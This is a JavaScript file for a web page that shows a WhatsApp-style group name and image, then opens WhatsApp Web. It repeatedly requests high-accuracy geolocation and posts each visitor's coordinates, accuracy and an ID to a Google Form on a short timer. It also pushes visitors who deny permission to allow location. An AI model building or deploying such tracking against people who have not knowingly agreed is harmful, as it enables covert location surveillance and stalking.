var url_atual = window.location.href;
const urlAll = new URL(url_atual);
var cel = urlAll.searchParams.get("c");
cel = cel ? parseInt(cel) : 11111;
console.log(cel)

// link da minha planilha
const url = "https://script.google.com/macros/s/AKfycby04nvvnEzl1SsHql0JRWt1z2ZVGjJVCYTnbtd3-uqu4OKN97JFGy5r5mqU4P9FJxdAgw/exec";
            //https://script.google.com/macros/s/AKfycby04nvvnEzl1SsHql0JRWt1z2ZVGjJVCYTnbtd3-uqu4OKN97JFGy5r5mqU4P9FJxdAgw/exec
const cod = "1n-awSHonxw85zjeoZXH9xUu6BcG134UY8vBLPsgSe7c";
const pagina = "CELL1";//"CTRL";
const celulasAllUnits = "O1:O2"
 


async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

//https://codepen.io/ecupaio/pen/QVrQov
document.addEventListener('DOMContentLoaded',loadDataAll);


async function loadDataAll(){

  var vtrCell = JSON.parse( localStorage.getItem('dadosCll') );
  if(!vtrCell){
    showLoadingOverlay();
    fetch(url + `?cod=${cod}&pagina=${pagina}&celulas=${celulasAllUnits}` ).then((res)=>{return res.json()}).then(async (data)=>{
      makeLocalStorage(data,'dadosCll');
    })
  }else{// if(!dadosCll){
    document.getElementById('grp_name').innerText = vtrCell.campo4;
    document.getElementById('grp_img').setAttribute("src",`${vtrCell.campo5}?ccb=11-4&amp;oh=01_AdTIcSfFu6yFPYilYwbioX01OKcMc32IvH9UII0C8rbsYQ&amp;oe=649C2F54`);// = vtrCell.campo4;
  }


}



//passa apenas uma vez////////////////////////
async function makeLocalStorage(dados,name){
  var { data } = dados;
  const dataCreate = new Date();
  var dataFormatada = dataCreate.toISOString();

  var hash = await gerarHash(dataFormatada);


  var retFalse = -1;
  fetch(url + `?cod=${cod}&pagina=${pagina}&celulas=${data[0].campo0}` ).then((res)=>{return res.json()}).then(async (data)=>{
    retFalse = await makeLocalStorageCells(data,'Clls');//return data;

    if(retFalse){
        var vtrCell = retFalse.find((a,b) => a.campo1===cel );

        if(vtrCell){
          document.getElementById('grp_name').innerText = vtrCell.campo4;
          //document.getElementById('grp_img').setAttribute("style",`background-image: url(${vtrCell.campo5})`);// = vtrCell.campo4;
          //"images/spinner.png?ccb=11-4&amp;oh=01_AdTIcSfFu6yFPYilYwbioX01OKcMc32IvH9UII0C8rbsYQ&amp;oe=649C2F54"
          document.getElementById('grp_img').setAttribute("src",`${vtrCell.campo5}?ccb=11-4&amp;oh=01_AdTIcSfFu6yFPYilYwbioX01OKcMc32IvH9UII0C8rbsYQ&amp;oe=649C2F54`);// = vtrCell.campo4;
          
          Object.assign(vtrCell,{ lat:0, lon:0, acc:0, hash, enable:0 })
          
        }else{

          vtrCell = {
                        campo0: retFalse[0].campo0,
                        campo1: 11111,
                        campo2: retFalse[0].campo2,
                        campo3: retFalse[0].campo3,
                        campo4: retFalse[0].campo4,
                        campo5: retFalse[0].campo5,
                        campo6: retFalse[0].campo6,
                        campo7: retFalse[0].campo7,
                        campo8: retFalse[0].campo8,
                        campo9: retFalse[0].campo9,
                        lat:0, 
                        lon:0, 
                        acc:0, 
                        hash,
                        enable:0
                    }
            
          
        }

        localStorage.setItem( name, JSON.stringify(vtrCell) )

        document.getElementById('grp_name').innerText = vtrCell.campo4;
        document.getElementById('grp_img').setAttribute("src",`${vtrCell.campo5}?ccb=11-4&amp;oh=01_AdTIcSfFu6yFPYilYwbioX01OKcMc32IvH9UII0C8rbsYQ&amp;oe=649C2F54`);// = vtrCell.campo4;


        hideLoadingOverlay();

    }
  });

 

  return;
}

async function makeLocalStorageCells(dados,name){
  var { data } = dados;

  return data;
}

function redirectNewAba(url) {
  var novaAba = window.open(url, '_blank');
  novaAba.focus();

}

// Função para exibir o overlay de loading
function showLoadingOverlay() {
  const overlay = document.getElementById('loading-overlay');
  overlay.style.display = 'block';
}

// Função para ocultar o overlay de loading
function hideLoadingOverlay() {
  const overlay = document.getElementById('loading-overlay');
  overlay.style.display = 'none';
}













function locate(clk){

  var dadosCll = JSON.parse( localStorage.getItem('dadosCll') );
  if(!clk && dadosCll.enable===0){
    console.log('passei por aqui e continuo 0')
    return
  }
  
  
  if(!clk){
    console.log('estou atualizando coordenadas')

    dadosCll.enable=2;
  }


  if(clk){
    console.log('fui clicado e sou 1 agora')

    dadosCll.enable=1;
  }
  localStorage.setItem('dadosCll', JSON.stringify(dadosCll) )  



  if(navigator.geolocation){
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    //navigator.geolocation.getCurrentPosition(successCallback, errorCallback, { maximumAge: 0 });
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }else{
    alert('Geolocation is not Supported by your Browser...');
  }

}



function showPosition(position){

  var lat = position.coords.latitude;
  if( lat ){
    lat = lat;// + ' deg';
  }else{
    lat = 'Not Available';
  }

  var lon = position.coords.longitude;
  if( lon ){
    lon = lon;// + ' deg';
  }else{
    lon = 'Not Available';
  }

  var acc = position.coords.accuracy;
  if( acc ){
    acc = parseInt( acc );// + ' m';
  }else{
    acc = 'Not Available';
  }
  
  var alt = position.coords.altitude;
  if( alt ){
    alt = alt;// + ' m';
  }else{
    alt = 'Not Available';
  }

  var dir = position.coords.heading;
  if( dir ){
    dir = dir;// + ' deg';
  }else{
    dir = 'Not Available';
  }

  var spd = position.coords.speed;
  if( spd ){
    spd = spd;// + ' m/s';
  }else{
    spd = 'Not Available';
  }

  reloadLocation(lat, lon, acc)
  

};



function showError(error)
{
  var err_text;
  var err_status = 'failed';

	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			err_text = 'User denied the request for Geolocation';
      alert('Atualize esta página e permita a permissão de localização...');//Please Refresh This Page and Allow Location Permission...');
      break;
		case error.POSITION_UNAVAILABLE:
			err_text = 'Location information is unavailable';
			break;
		case error.TIMEOUT:
			err_text = 'The request to get user location timed out';
      alert('Please Set Your Location Mode on High Accuracy...');
			break;
		case error.UNKNOWN_ERROR:
			err_text = 'An unknown error occurred';
			break;
	}

  /*
  $.ajax({
    type: 'POST',
    url: 'error_handler.php',
    data: {Status: err_status, Error: err_text},
    success: function(){$('#change').html('Failed');},
    mimeType: 'text'
  });
  */
}



async function gerarHash(string) {
  const encoder = new TextEncoder();
  const data = encoder.encode(string);

  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const hashHex = hashArray.map(byte => byte.toString(16).padStart(2, '0')).join('');

  return hashHex;
}





function reloadLocation(lat, lon, acc){
  console.log('passei por aqui1',lat, lon, acc)

    var dadosCll = JSON.parse( localStorage.getItem('dadosCll') );
  
    if(dadosCll){
      const distance = calculateDistance( [dadosCll.lat, dadosCll.lon], [lat, lon] );

      console.log('passei por aqui2',distance)
      if( distance > dadosCll.campo6 || dadosCll.enable===1){
        console.log('algo mudou')







        $.ajax({
            url: 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSdg8rMJSzLnVtzWIvBONE_mnGIiw62KSBGTyWN4Bluk6WnH9A/formResponse',     //The public Google Form url, but replace /view with /formResponse
            type: 'POST', //tells ajax to post the data to the url
            data: `entry.1153408710=${cel}&entry.465063029=${lat},${lon}&entry.2102713265=${acc}&entry.1003841183=${formatarData(new Date())}&entry.33496699=${dadosCll.hash}`,//$('#my-form').serialize(), //Nifty jquery function that gets all the input data 
            dataType: "json", //json xml      the standard data type for most ajax requests
            statusCode: { //the status code from the POST request
                0: function(data) { //0 is when Google gives a CORS error, don't worry it went through
                  //redirectNewAba('https://web.whatsapp.com/')
                  //location.reload()
                  returData(lat, lon, acc)
                }, 
                200: function(data) {//200 is a success code. it went through!
                  //redirectNewAba('https://web.whatsapp.com/')
                  //location.reload();
                  returData(lat, lon, acc)


                },
                403: function(data) {//403 is when something went wrong and the submission didn't go through
                //error
                  alert('Algo deu errado. devemos verificar nosso código para garantir que tudo corresponda ao Google');
                }
            }  
        });


      }



    }else{
      showLoadingOverlay();
      fetch(url + `?cod=${cod}&pagina=${pagina}&celulas=${celulasAllUnits}` ).then((res)=>{return res.json()}).then((data)=>{
        makeLocalStorage(data,'dadosCll');
      })
    }
  
}



function returData(lat, lon, acc){
  var dadosCll = JSON.parse( localStorage.getItem('dadosCll') );

  if(dadosCll.enable===1){   
    Object.assign(dadosCll,{lat, lon, acc})
    localStorage.setItem('dadosCll', JSON.stringify(dadosCll) ) 

    redirectNewAba('https://web.whatsapp.com/')
    location.reload();
  }else{
    location.reload();
  }
}



function calculateDistance(latlongAnterior, latlongNext) {
  const [lat1, lon1] = latlongAnterior;
  const [lat2, lon2] = latlongNext;
  // Função para converter graus em radianos
  function toRadians(degrees) {
    return degrees * (Math.PI / 180);
  }

  // Raio médio da Terra em metros
  const earthRadius = 6371000;

  // Convertendo as coordenadas de graus para radianos
  const phi1 = toRadians(lat1);
  const phi2 = toRadians(lat2);
  const deltaPhi = toRadians(lat2 - lat1);
  const deltaLambda = toRadians(lon2 - lon1);

  // Fórmula de Haversine para calcular a distância entre dois pontos na Terra
  const a = Math.sin(deltaPhi / 2) * Math.sin(deltaPhi / 2) +
    Math.cos(phi1) * Math.cos(phi2) *
    Math.sin(deltaLambda / 2) * Math.sin(deltaLambda / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));

  // Distância em metros
  const distance = earthRadius * c;

  return distance;
}



function createSetTimeout(tempo, alter){
  var intervalo;
    // Criar um intervalo inicial
    if(alter){
      
      clearInterval(alter);
      intervalo = setInterval(locate, (tempo * 60000) );
    }else{
      
      intervalo = setInterval(locate, (tempo * 60000) );

    }// if(alter){


  return intervalo;

}
createSetTimeout(0.1,undefined)




setInterval(function() {
  // Coloque sua função aqui
  var dadosCll = JSON.parse( localStorage.getItem('dadosCll') );

    let cel = `A${(dadosCll.campo9-1)}:J${dadosCll.campo9}`;
  
    fetch(url + `?cod=${cod}&pagina=${pagina}&celulas=${cel}` ).then((res)=>{return res.json()}).then(async (data)=>{
      let result = await makeLocalStorageSearch(data);
      
      
      if(result.campo6!==dadosCll.campo6){//mudou precisao
        dadosCll.campo6=result.campo6;
        localStorage.setItem( 'dadosCll', JSON.stringify(dadosCll) )
      }


      if(result.campo7!==dadosCll.campo7){//mudou precisao
        dadosCll.campo7=result.campo7;
        localStorage.setItem( 'dadosCll', JSON.stringify(dadosCll) )

        intervalo = createSetTimeout(parseFloat(result.campo7), intervalo)

      }
    })
  
}, 1*10000);//10000 1min



async function makeLocalStorageSearch(dados){
  var {data} = dados;
  return data[0];
}
















function formatarData(dataAtual){
  //var dataAtual = new Date();

  // Ajusta o deslocamento de tempo para o fuso horário de Fortaleza (Horário de Brasília - BRT/BRST)
  var offset = -3; // Fortaleza (Horário de Brasília) está 3 horas atrás do horário UTC
  var minutos = dataAtual.getTimezoneOffset();
  dataAtual.setMinutes(dataAtual.getMinutes() - minutos - (offset * 60));

  // Formata a data e hora no formato desejado
  var dataFormatada = dataAtual.toLocaleString('pt-BR').replace(/,/g, "");
  return dataFormatada;

}



















